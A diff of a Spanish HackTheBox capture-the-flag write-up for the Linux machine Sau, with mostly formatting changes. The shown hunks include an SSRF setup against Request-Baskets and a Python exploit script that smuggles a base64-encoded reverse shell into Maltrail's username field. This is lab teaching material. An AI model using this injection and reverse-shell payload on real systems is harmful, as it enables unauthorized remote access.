@@ -1,31 +1,32 @@
 ---
-title: "Sau - HackTheBox"
-description: "Writeup de la máquina Sau de HackTheBox, una máquina Linux fácil que involucra SSRF en Request-Baskets y explotación de Maltrail."
-pubDate: 2026-11-02
-platform: "htb"
-category: "machines"
-difficulty: "easy"
-os: "linux"
+title: 'Sau - HackTheBox'
+description: 'Writeup de la máquina Sau de HackTheBox, una máquina Linux fácil que involucra SSRF en Request-Baskets y explotación de Maltrail.'
+pubDate: 2025-11-02
+platform: 'htb'
+category: 'machines'
+difficulty: 'easy'
+os: 'linux'
 language: es
-tags: ["ssrf", "request-baskets", "maltrail", "CVE-2023-27163", "command-injection"]
+tags:
+  ['ssrf', 'request-baskets', 'maltrail', 'CVE-2023-27163', 'command-injection']
 retired: false
-logo: "/images/writeups/htb/sau/logo.png"
-heroImage: "/images/writeups/htb/sau/card.png"
-attackVectors: ["web"]
-techniques: ["T1190", "T1918", "T1059"]
-vulnerabilities: ["CVE-2023-27163", "CVE-2023-26035"]
-certifications: ["OSCP", "eJPT"]
-skillLevel: "beginner"
-estimatedTime: "1-2 horas"
+logo: '/images/writeups/htb/sau/logo.png'
+heroImage: '/images/writeups/htb/sau/card.png'
+attackVectors: ['web']
+techniques: ['T1190', 'T1918', 'T1059']
+vulnerabilities: ['CVE-2023-27163', 'CVE-2023-26035']
+certifications: ['OSCP', 'eJPT']
+skillLevel: 'beginner'
+estimatedTime: '1-2 horas'
 points: 20
 rating: 4.4
 ---
 
 # Sau - HackTheBox Writeup
 
-**Dificultad**: Easy  
-**OS**: Linux  
-**Plataforma**: HackTheBox  
+**Dificultad**: Easy
+**OS**: Linux
+**Plataforma**: HackTheBox
 **IP**: 10.10.11.224
 
 ## Introducción
@@ -41,6 +42,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.224 -oG allPorts
 ```
 
 **Puertos abiertos:**
+
 - 22/tcp - SSH
 - 55555/tcp - HTTP (filtrado inicialmente)
 - 80/tcp - HTTP (filtrado)
@@ -52,6 +54,7 @@ nmap -p22,55555,80 -sCV 10.10.11.224 -oN targeted
 ```
 
 **Resultados:**
+
 - **22/tcp** - OpenSSH 8.2p1 Ubuntu
 - **55555/tcp** - HTTP - request-baskets 1.2.1
 - **80/tcp** - Filtrado
@@ -79,6 +82,7 @@ curl -X POST http://10.10.11.224:55555/api/baskets/test -H 'Content-Type: applic
 ```
 
 o usando la interfaz web, creamos un basket llamado "test" con la configuración:
+
 - **Forward URL**: http://127.0.0.1:80/
 - **Proxy Response**: ✓
 
@@ -118,25 +122,25 @@ def main():
     if len(sys.argv) != 3:
         print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
         sys.exit(1)
-    
+
     lhost = sys.argv[1]
     lport = sys.argv[2]
-    
+
     # Reverse shell payload
     payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])'"
-    
+
     # Encode payload
     encoded = base64.b64encode(payload.encode()).decode()
-    
+
     # Target through SSRF
     target = "http://10.10.11.224:55555/test"
-    
+
     # Malicious username
     username = f";`echo {encoded}|base64 -d|bash`"
-    
+
     # Send exploit
     data = {"username": username}
-    
+
     print(f"[+] Sending exploit to {target}")
     requests.post(target + "/login", data=data)
     print(f"[+] Check your listener on {lhost}:{lport}")
@@ -169,6 +173,7 @@ export SHELL=bash
 ```
 
 **User flag:**
+
 ```bash
 cat /home/puma/user.txt
 ```
@@ -182,6 +187,7 @@ sudo -l
 ```
 
 **Resultado:**
+
 ```
 User puma may run the following commands on sau:
     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
@@ -215,6 +221,7 @@ sudo /usr/bin/systemctl status trail.service
 ```
 
 **Root flag:**
+
 ```bash
 cat /root/root.txt
 ```
@@ -242,6 +249,7 @@ curl -X POST 'http://10.10.11.224:55555/test/login' \
 ## Conclusión
 
 Sau es una excelente máquina para practicar:
+
 - Explotación de SSRF (CVE-2023-27163)
 - Pivoting a través de servicios internos
 - Command injection en aplicaciones web
@@ -249,6 +257,7 @@ Sau es una excelente máquina para practicar:
 - Técnicas de escape de comandos
 
 **Lecciones aprendidas:**
+
 - Los servicios internos pueden ser accesibles mediante SSRF
 - Siempre enumerar servicios filtrados
 - Validar entrada en todos los parámetros de usuario
@@ -256,6 +265,7 @@ Sau es una excelente máquina para practicar:
 - Revisar permisos sudo cuidadosamente
 
 **Mitigaciones:**
+
 - Actualizar Request-Baskets a versiones parcheadas
 - Implementar validación estricta de URLs en proxies
 - Actualizar Maltrail a la última versión
